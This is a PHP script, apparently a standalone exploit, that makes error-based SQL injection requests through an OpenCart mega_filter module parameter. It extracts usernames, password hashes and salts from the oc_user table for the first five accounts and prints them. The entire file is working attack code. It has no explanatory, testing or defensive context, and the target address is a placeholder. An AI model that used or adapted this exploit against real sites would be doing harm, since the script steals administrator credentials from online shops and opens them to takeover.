<?php error_reporting(0);


$link = "http://-link-here-dot-com/index.php?route=module/mega_filter/results&mfp=";


function curl_me($url/*,$post*/){

if($curl = curl_init()) {
    curl_setopt($curl,CURLOPT_URL, $url);
    curl_setopt($curl,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($curl,CURLOPT_FOLLOWLOCATION,true);
    /*curl_setopt($curl, CURLOPT_POSTFIELDS, $post);*/
    curl_setopt($curl,CURLOPT_CONNECTTIMEOUT,30);
    curl_setopt($curl,CURLOPT_USERAGENT,'JKOIhlklk!');
    $response = curl_exec($curl);
    curl_close($curl);
    $tmp = explode('qbbjq',$response);
    $value = explode('qbbjq1',$tmp[1]);
    $out = $value[0];
    return $out;

}

}
$i = 0;
while($i < 5){
$username_payload = "%27%20AND%20(SELECT%209703%20FROM(SELECT%20COUNT(*),CONCAT(0x7162626a71,(SELECT%20MID((IFNULL(CAST(username%20AS%20CHAR),0x20)),1,54)%20FROM%20oc_user%20LIMIT%20".$i.",1),0x7162626a71,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)%20AND%20%27vLGl%27=%27vLGl";

$password_payload = "%27%20AND%20(SELECT%209703%20FROM(SELECT%20COUNT(*),CONCAT(0x7162626a71,(SELECT%20MID((IFNULL(CAST(password%20AS%20CHAR),0x20)),1,54)%20FROM%20oc_user%20LIMIT%20".$i.",1),0x7162626a71,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)%20AND%20%27vLGl%27=%27vLGl";

$salt_payload = "%27%20AND%20(SELECT%209703%20FROM(SELECT%20COUNT(*),CONCAT(0x7162626a71,(SELECT%20MID((IFNULL(CAST(salt%20AS%20CHAR),0x20)),1,54)%20FROM%20oc_user%20LIMIT%20".$i.",1),0x7162626a71,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)%20AND%20%27vLGl%27=%27vLGl";

$username = $link.$username_payload;
$password = $link.$password_payload;
$salt = $link.$salt_payload;

$usr = curl_me($username);
$pwd = curl_me($password);
$slt = curl_me($salt);

print $usr.":".$pwd.":".$slt.PHP_EOL;

$i++;
}